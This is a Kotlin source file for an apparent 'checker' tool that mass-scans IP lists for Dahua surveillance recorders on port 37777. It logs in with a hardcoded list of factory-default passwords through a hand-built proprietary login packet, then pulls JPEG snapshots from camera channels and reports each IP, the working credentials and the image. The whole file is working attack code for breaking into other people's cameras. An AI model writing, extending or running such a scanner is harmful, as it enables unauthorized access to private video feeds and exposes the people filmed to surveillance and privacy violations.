package com.dahua.checker

import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket

data class ScanResult(
    val ip: String,
    val login: String,
    val password: String,
    val snapshot: ByteArray?
)

data class ScanProgress(
    val total: Int,
    val checked: Int,
    val successful: Int,
    val elapsedMs: Long
)

class DahuaScanner {

    companion object {
        const val PORT = 37777
        const val TIMEOUT_CONNECT = 2500
        const val TIMEOUT_SNAPSHOT = 3000
        const val BATCH_SIZE = 20
        const val MAX_CONCURRENT = 8

        val CREDENTIALS = listOf(
            "admin" to "admin",
            "admin" to "123456",
            "666666" to "666666",
            "888888" to "888888",
            "default" to "tluafed",
            "admin" to "admin123",
            "user" to "user",
            "admin" to ""
        )

        private val LOGIN_PREFIX = byteArrayOf(
            0xa0.toByte(), 0x00, 0x00, 0x60
        )
        private val LOGIN_SUFFIX_PART = byteArrayOf(
            0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1.toByte(), 0xaa.toByte()
        )
    }

    @Volatile
    var cancelled = false

    private val semaphore = Semaphore(MAX_CONCURRENT)

    suspend fun scan(
        ips: List<String>,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        val total = ips.size
        var checked = 0
        var successful = 0
        val startTime = System.currentTimeMillis()

        for (batchStart in ips.indices step BATCH_SIZE) {
            if (cancelled) break

            val batch = ips.subList(batchStart, minOf(batchStart + BATCH_SIZE, total))

            val results = coroutineScope {
                batch.map { ip ->
                    async(Dispatchers.IO) {
                        if (cancelled) return@async null
                        semaphore.withPermit {
                            tryCredentials(ip)
                        }
                    }
                }.awaitAll()
            }

            for (result in results) {
                if (cancelled) break
                if (result != null) {
                    successful++
                    onResult(result)
                }
                checked++
            }

            val elapsed = System.currentTimeMillis() - startTime
            onProgress(ScanProgress(total, checked, successful, elapsed))
        }

        if (!cancelled) {
            val elapsed = System.currentTimeMillis() - startTime
            onProgress(ScanProgress(total, total, successful, elapsed))
        }
    }

    private fun tryCredentials(ip: String): ScanResult? {
        for ((login, password) in CREDENTIALS) {
            if (cancelled) return null
            try {
                val socket = Socket()
                socket.connect(InetSocketAddress(ip, PORT), TIMEOUT_CONNECT)
                socket.soTimeout = TIMEOUT_CONNECT

                val output = socket.getOutputStream()
                val input = socket.getInputStream()

                try {
                    val authOk = sendLogin(output, input, login, password)
                    if (!authOk) {
                        socket.close()
                        continue
                    }

                    for (ch in intArrayOf(0, 1)) {
                        try {
                            socket.soTimeout = TIMEOUT_SNAPSHOT
                            val photo = getSnapshot(output, input, ch)
                            if (photo != null && photo.size > 100) {
                                socket.close()
                                return ScanResult(ip, login, password, photo)
                            }
                        } catch (_: Exception) {
                            continue
                        }
                    }

                    socket.close()
                    break
                } catch (_: Exception) {
                    socket.close()
                    continue
                }
            } catch (_: Exception) {
                continue
            }
        }
        return null
    }

    private fun sendLogin(output: OutputStream, input: InputStream, login: String, password: String): Boolean {
        val loginBytes = login.toByteArray(Charsets.US_ASCII)
        val passwordBytes = password.toByteArray(Charsets.US_ASCII)
        val loginPadded = ByteArray(8)
        val passwordPadded = ByteArray(8)
        loginBytes.copyInto(loginPadded, 0, 0, minOf(loginBytes.size, 8))
        passwordBytes.copyInto(passwordPadded, 0, 0, minOf(passwordBytes.size, 8))

        val timestamp = System.currentTimeMillis().toString().toByteArray(Charsets.US_ASCII)
        val suffix = "&&${login}\u0000Random:${String(timestamp)}\r\n\r\n".toByteArray(Charsets.US_ASCII)

        val totalLen = 24 + loginBytes.size + passwordBytes.size
        if (totalLen > 255) return false

        val packet = ByteArrayOutputStream()
        packet.write(LOGIN_PREFIX)
        packet.write(totalLen)
        packet.write(byteArrayOf(0x00, 0x00, 0x00))
        packet.write(loginPadded)
        packet.write(passwordPadded)
        packet.write(LOGIN_SUFFIX_PART)
        packet.write(login.toByteArray(Charsets.US_ASCII))
        packet.write(suffix)

        output.write(packet.toByteArray())
        output.flush()

        val response = ByteArray(9)
        var read = 0
        while (read < 9) {
            val r = input.read(response, read, 9 - read)
            if (r == -1) return false
            read += r
        }
        return response[8].toInt() == 0
    }

    private fun getSnapshot(output: OutputStream, input: InputStream, channelId: Int): ByteArray? {
        val chByte = channelId.toByte()

        val cmd = byteArrayOf(
            0x11, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
            chByte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, chByte, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        )

        output.write(cmd)
        output.flush()

        val buffer = ByteArrayOutputStream()
        val chunk = ByteArray(4096)
        val deadline = System.currentTimeMillis() + TIMEOUT_SNAPSHOT

        while (System.currentTimeMillis() < deadline) {
            try {
                val r = input.read(chunk)
                if (r == -1) break
                buffer.write(chunk, 0, r)
                val data = buffer.toByteArray()
                if (containsJpegEnd(data)) break
            } catch (_: java.net.SocketTimeoutException) {
                break
            }
        }

        val data = buffer.toByteArray()
        val startIdx = findBytes(data, byteArrayOf(0xff.toByte(), 0xd8.toByte()))
        val endIdx = findBytes(data, byteArrayOf(0xff.toByte(), 0xd9.toByte()))

        if (startIdx != -1 && endIdx != -1 && startIdx < endIdx) {
            return data.copyOfRange(startIdx, endIdx + 2)
        }
        return null
    }

    private fun containsJpegEnd(data: ByteArray): Boolean {
        for (i in 0 until data.size - 1) {
            if (data[i] == 0xff.toByte() && data[i + 1] == 0xd9.toByte()) return true
        }
        return false
    }

    private fun findBytes(data: ByteArray, pattern: ByteArray): Int {
        for (i in 0..data.size - pattern.size) {
            var match = true
            for (j in pattern.indices) {
                if (data[i + j] != pattern[j]) {
                    match = false
                    break
                }
            }
            if (match) return i
        }
        return -1
    }
}
